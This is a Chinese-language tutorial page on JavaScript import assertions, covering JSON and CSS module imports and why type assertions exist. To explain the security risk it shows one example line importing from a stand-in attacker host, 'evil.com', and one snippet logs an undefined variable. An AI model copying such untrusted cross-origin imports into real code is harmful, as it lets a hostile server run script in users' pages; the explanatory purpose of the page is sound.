---
description: import assertions 导入断言
keywords:
  - JavaScript
image: https://picgo-1259617372.cos.ap-beijing.myqcloud.com/Picgo/2022/01/19-11-28-23-404Lab.jpeg
tags: [JavaScript]
---


import Highlight from '../../src/components/highlight'

默认情况下，ES Module 只能导入 JS 代码。

ES Module 无法导入 JSON, 而 CommonJS 支持导入 JSON。

``` js title="✅ commonjs.cjs"
const config = require('./config.json')
console.log(config.other.time); // 20220202
```

```js title="❌ es.mjs"
import config from './config.json' assert  { type: 'json' }
console.log(config) //Error: ERR_IMPORT_ASSERTION_TYPE_MISSING
```

### 为什么不支持 JSON Module

Web 平台在执行模块资源之前，会检查 **MIME 类型的有效性**，但是仅仅依赖 MIME 会**存在安全问题**。

模块允许跨源导入，所以第三方服务器有可能使用 JavaScript MIME 的类型却恶意的将 JavaScript 作为响应，并在导入程序的域中运行该恶意代码。

```js
// Executes JS if evil.com responds with a
// JavaScript MIME type (e.g. `text/javascript`)!
import data from 'https://evil.com/data.json';
```

所以，文件扩展名并不能用来确定文件的类型。

**解决方案**: 必须由开发者使用导入断言来指定它应该是 JSON 文件，如果 MIME 类型与预期不符合，则应导入失败。

### import assertions

这个[新的提案](https://github.com/tc39/proposal-import-assertions)已经进入第三阶段，它允许将 JSON 导入 ES Module 中。

新的导入断言特性允许模块导入语句在模块旁包含其他信息，通过下面的语法导入：

```js
import json from "./foo.json" assert { type: "json" };
import("foo.json", { assert: { type: "json" } });

console.log(foo) 
```



另外，[CSS module scripts](https://chromestatus.com/feature/5948572598009856) 也可以使用导入断言，未来将会更加完善。

```css title="styles.css"
@import url('./atImported.css'); /* div: background-color: blue; 但会被 css module 忽略 */
div {
    border: 1em solid green;
}
```

```html title="index.html"
<script type="module">
    import styles from './styles.css' assert { type: "css" };
    document.adoptedStyleSheets = [styles];
</script>

<div>这个div应该是绿色的边框，但不会有蓝色背景</div>
```




:::note  参考资料
 
 https://v8.dev/features/import-assertions

 https://dmitripavlutin.com/javascript-json-modules/

 https://chromestatus.com/feature/5948572598009856

 https://github.com/tc39/proposal-import-assertions
 
 https://web.dev/css-module-scripts/

:::